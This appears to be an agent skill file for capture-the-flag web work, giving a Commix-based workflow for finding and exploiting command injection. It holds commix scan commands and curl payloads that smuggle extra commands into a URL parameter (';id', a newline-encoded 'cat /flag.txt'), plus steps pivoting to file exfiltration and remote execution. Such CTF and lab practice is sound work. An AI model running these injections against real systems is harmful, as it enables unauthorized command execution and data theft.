---
name: command-injection-automation
description: "Automated command injection validation and exploitation workflow for CTF web targets using Commix, plus manual verification patterns for false-positive control. Use when parameters look shell-connected (ping, traceroute, convert, backup, diagnostics, export hooks)."
license: MIT
compatibility: Requires filesystem-based agent (Hermes compatible)
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
---

<!-- Original file: ctf-web/command-injection-automation/SKILL.md -->

# Procedimiento

Sigue los pasos y referencias del contenido base de esta habilidad.

## Guardrails de seguridad

- Ejecuta comandos de este skill solo en entornos autorizados (CTF/lab/sandbox).
- Comienza con tecnicas de deteccion no destructivas (time-based/echo markers).
- Confirma manualmente cada finding antes de escalar a RCE completa.

## Contenido base

# CTF Web - Command Injection Automation

## Prerequisites

```bash
pip install commix
```

## Workflow

1. Identifica parametros shell-likely.
2. Prueba payloads de confirmacion minima.
3. Ejecuta commix con tecnica acotada.
4. Verifica manualmente output/time side-channel.
5. Pivota a exfiltracion de archivo o comando puntual de flag.

## Quick commands

```bash
# Scan basico sobre URL
commix --url='https://target.tld/ping?host=127.0.0.1'

# POST parameter testing
commix --url='https://target.tld/diag' --data='ip=127.0.0.1&submit=1'

# Tecnica de tiempo para validacion silenciosa
commix --url='https://target.tld/ping?host=127.0.0.1' --technique=T

# Limitar tests para reducir ruido
commix --url='https://target.tld/run?cmd=id' --level=1 --risk=1
```

## Verificacion manual rapida

```bash
curl 'https://target.tld/ping?host=127.0.0.1;id'
curl 'https://target.tld/ping?host=127.0.0.1%0acat%20/flag.txt'
```

## Cuando pivotar

- Si hay ejecucion confirmada, continuar en `server-side-exec`.
- Si solo hay file-read indirecto, probar `server-side` (LFI/filters).
